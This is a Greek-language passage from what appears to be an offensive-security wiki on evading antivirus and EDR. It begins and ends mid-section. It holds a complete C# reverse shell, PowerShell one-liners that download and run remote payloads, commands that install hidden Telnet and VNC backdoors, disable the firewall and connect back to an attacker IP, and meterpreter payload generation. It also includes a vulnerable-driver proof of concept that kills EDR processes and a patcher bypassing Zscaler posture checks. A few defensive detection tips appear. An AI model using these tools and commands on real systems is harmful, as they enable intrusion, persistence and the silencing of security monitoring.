> Πολλές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία θα αυξήσει την εντροπία του binary και θα διευκολύνει τα AVs και EDRs στο να το ανιχνεύσουν. Να είστε προσεκτικοί με αυτό και ίσως εφαρμόστε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικα που είναι ευαίσθητα ή πρέπει να κρυφτούν.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Όταν αναλύετε malware που χρησιμοποιεί ConfuserEx 2 (ή commercial forks) είναι συνηθισμένο να συναντάτε πολλαπλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes. Το workflow παρακάτω επαναφέρει αξιόπιστα μια σχεδόν-πρωτότυπη IL που στη συνέχεια μπορεί να γίνει decompile σε C# με εργαλεία όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum οπότε οποιαδήποτε αλλαγή θα κάνει το binary να καταρρεύσει. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους metadata πίνακες, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες όταν φτιάχνετε το δικό σας unpacker.

2.  Symbol / control-flow recovery – δώστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το ConfuserEx 2 profile  
• de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Proxy-call stripping – ConfuserEx αντικαθιστά απευθείας κλήσεις με lightweight wrappers (a.k.a *proxy calls*) για να δυσκολέψει περαιτέρω το decompilation. Αφαιρέστε τα με **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να παρατηρήσετε φυσικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – τρέξτε το παραγόμενο binary στο dnSpy, ψάξτε για μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array αρχικοποιημένο μέσα σε `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειάζεται να τρέξετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη τριάζ των samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του έργου είναι να παρέχει ένα ανοικτού κώδικα fork του [LLVM](http://www.llvm.org/) compilation suite ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που παράγεται από το πλαίσιο C++ template metaprogramming, το οποίο θα κάνει τη ζωή αυτού που θέλει να crack-άρει την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is a x64 binary obfuscator that is able to obfuscate various different pe files including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is a simple metamorphic code engine for arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is a fine-grained code obfuscation framework for LLVM-supported languages using ROP (return-oriented programming). ROPfuscator obfuscates a program at the assembly code level by transforming regular instructions into ROP chains, thwarting our natural conception of normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is able to convert existing EXE/DLL into shellcode and then load them

## SmartScreen & MoTW

Ίσως έχετε δει αυτή την οθόνη όταν κατεβάζετε κάποια executables από το διαδίκτυο και τα εκτελείτε.

Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφάλειας που σκοπό έχει να προστατεύει τον τελικό χρήστη από την εκτέλεση πιθανώς κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen κυρίως λειτουργεί με μια προσέγγιση βασισμένη στη φήμη, που σημαίνει ότι εφαρμογές που δεν έχουν κατέβει συχνά θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας και αποτρέποντας τον τελικό χρήστη από το να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμα να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένας [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, ο οποίος δημιουργείται αυτόματα κατά τη λήψη αρχείων από το διαδίκτυο, μαζί με το URL από το οποίο κατεβάστηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατεβάστηκε από το διαδίκτυο.</p></figcaption></figure>

> [!TIP]
> Σημαντικό είναι να σημειωθεί ότι εκτελέσιμα που έχουν υπογραφεί με ένα **trusted** signing certificate **won't trigger SmartScreen**.

Μια πολύ αποτελεσματική μέθοδος για να αποτρέψετε τα payloads σας από το να αποκτήσουν το Mark of The Web είναι να τα πακετάρετε μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που πακετάρει payloads σε output containers για να παρακάμψει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows που επιτρέπει σε εφαρμογές και συστατικά του συστήματος να **καταγράφουν γεγονότα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφάλειας για να παρακολουθούν και να εντοπίζουν κακόβουλες δραστηριότητες.

Παρόμοια με το πώς απενεργοποιείται (παρακάμπτεται) το AMSI, είναι επίσης δυνατό να κάνουμε τη συνάρτηση **`EtwEventWrite`** της user space process να επιστρέφει αμέσως χωρίς να καταγράφει γεγονότα. Αυτό επιτυγχάνεται με το patching της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για αυτή τη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στο **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Το φόρτωμα C# binaries στη μνήμη είναι γνωστό εδώ και καιρό και εξακολουθεί να είναι ένας πολύ καλός τρόπος για να τρέχετε τα post-exploitation εργαλεία σας χωρίς να εντοπιστείτε από το AV.

Επειδή το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να πιάσει δίσκο, το μόνο που θα χρειαστεί να μας απασχολεί είναι το patching του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ήδη παρέχουν τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει το **spawn μιας νέας «θυσιαστικής» process**, την inject του post-exploitation κακόβουλου κώδικα σε αυτή τη νέα διεργασία, την εκτέλεσή του και όταν τελειώσει, το kill της νέας διεργασίας. Αυτό έχει και οφέλη και μειονεκτήματα. Το όφελος της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της Beacon implant process μας. Αυτό σημαίνει ότι αν κάτι στις post-exploitation ενέργειές μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant να επιβιώσει.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την εισαγωγή (injecting) του post-exploitation κακόβουλου κώδικα **στον ίδιο του τον process**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τον έλεγχό της από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το φόρτωμα C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το βίντεο του S3cur3th1sSh1t (https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε κακόβουλο κώδικα χρησιμοποιώντας άλλες γλώσσες δίνοντας στο συμβιβασμένο μηχάνημα πρόσβαση **στο περιβάλλον του interpreter εγκατεστημένο στο SMB share που ελέγχεται από τον Attacker.**

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες μέσα στη μνήμη** του συμβιβασμένου μηχανήματος.

Το repo αναφέρει: Το Defender εξακολουθεί να σαρώνει τα scripts αλλά αξιοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε static signatures**. Δοκιμές με τυχαία μη-αποκρυπτογραφημένα (un-obfuscated) reverse shell scripts σε αυτές τις γλώσσες απέδειξαν ότι είναι επιτυχείς.

## TokenStomping

Token stomping είναι μια τεχνική που επιτρέπει σε έναν επιτιθέμενο να **χειραγωγήσει το access token ή ένα προϊόν ασφάλειας όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges έτσι ώστε η διεργασία να μην πεθάνει αλλά να μην έχει δικαιώματα να ελέγξει για κακόβουλες δραστηριότητες.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **αποτρέψουν εξωτερικές διεργασίες** από το να αποκτούν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο απλώς να εγκαταστήσετε το Chrome Remote Desktop σε έναν υπολογιστή θύμα και να το χρησιμοποιήσετε για να αναλάβετε τον έλεγχο και να διατηρήσετε persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει να ορίσετε το pin χωρίς χρήση του GUI).


## Advanced Evasion

Η αποφυγή ανίχνευσης είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι πρακτικά αδύνατο να μείνετε τελείως αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που θα αντιμετωπίσετε θα έχει τα δικά του πλεονεκτήματα και αδυναμίες.

Συνιστώ ανεπιφύλακτα να δείτε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε ένα σημείο εισόδου σε πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια άλλη εξαιρετική ομιλία από [@mariuszbit](https://twitter.com/mariuszbit) για Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο μέρος το Defender** θεωρεί κακόβουλο και να σας το αναλύσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο** είναι το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιείχαν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάνε το να **ξεκινά** όταν το σύστημα ξεκινά και **τρέξε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλάξτε το telnet port** (κρυφό) και απενεργοποιήστε το firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ON THE HOST**: Εκτελέστε _**winvnc.exe**_ και διαμορφώστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό στο _VNC Password_
- Ορίστε έναν κωδικό στο _View-Only Password_

Στη συνέχεια, μετακινήστε το δυαδικό _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στον **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα** στο δικό του **host** το δυαδικό `vncviewer.exe -listen 5900` ώστε να είναι **προετοιμασμένος** να πιάσει μια αντίστροφη **VNC connection**. Έπειτα, μέσα στο **victim**: Ξεκινήστε το daemon winvnc `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Για να διατηρήσετε τη διακριτικότητα πρέπει να μην κάνετε τα εξής

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων Defender θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρησιμοποιώντας compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση python για παράδειγμα build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Απενεργοποίηση AV/EDR από τον χώρο του kernel

Η Storm-2603 αξιοποίησε μια μικρή βοηθητική εφαρμογή κονσόλας γνωστή ως **Antivirus Terminator** για να απενεργοποιήσει τις προστασίες endpoint πριν ρίξει ransomware. Το εργαλείο φέρνει τον δικό του **ευάλωτο αλλά *υπογεγραμμένο* driver** και τον εκμεταλλεύεται για να εκτελέσει προνομιούχες λειτουργίες kernel που ακόμη και οι υπηρεσίες AV Protected-Process-Light (PPL) δεν μπορούν να μπλοκάρουν.

Key take-aways
1. **Signed driver**: Το αρχείο που κατατίθεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το δυαδικό είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το System In-Depth Analysis Toolkit της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη και όταν η Driver-Signature-Enforcement (DSE) είναι ενεργοποιημένη.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον εκκινεί ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματίζει οποιαδήποτε διεργασία βάσει PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγράφει οποιοδήποτε αρχείο στο δίσκο |
| `0x990001D0` | Αποφορτώνει τον driver και αφαιρεί την υπηρεσία |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: Το BYOVD παρακάμπτει πλήρως τις προστασίες σε user-mode· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* διεργασίες, να τις τερματίσει ή να παραποιήσει αντικείμενα του kernel ανεξάρτητα από PPL/PP, ELAM ή άλλα μέτρα σκληρύνσεως.

Ανίχνευση / Αντιμετώπιση
• Ενεργοποιήστε τη λίστα αποκλεισμού ευπαθών drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.  
• Παρακολουθείστε τη δημιουργία νέων *kernel* υπηρεσιών και ειδοποιήστε όταν ένας driver φορτώνεται από κατάλογο με δικαιώματα εγγραφής για όλους ή όταν δεν υπάρχει στη λίστα επιτρεπόμενων.  
• Επιτηρείστε για user-mode handles σε προσαρμοσμένα device objects που ακολουθούνται από ύποπτες κλήσεις `DeviceIoControl`.

### Παρακάμπτοντας τους ελέγχους posture του Zscaler Client Connector μέσω patching δυαδικών αρχείων στο δίσκο

Ο **Client Connector** της Zscaler εφαρμόζει κανόνες device-posture τοπικά και βασίζεται στο Windows RPC για να μεταφέρει τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **αποκλειστικά client-side** (αποστέλλεται ένα boolean στον server).  
2. Τα εσωτερικά RPC endpoints επαληθεύουν μόνο ότι το συνδεόμενο εκτελέσιμο είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων υπογεγραμμένων δυαδικών αρχείων στο δίσκο** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, έτσι κάθε έλεγχος θεωρείται συμβατός |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και μη υπογεγραμμένη) διεργασία μπορεί να κάνει bind στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε με `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας στο tunnel | Παρακαμφθούν |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
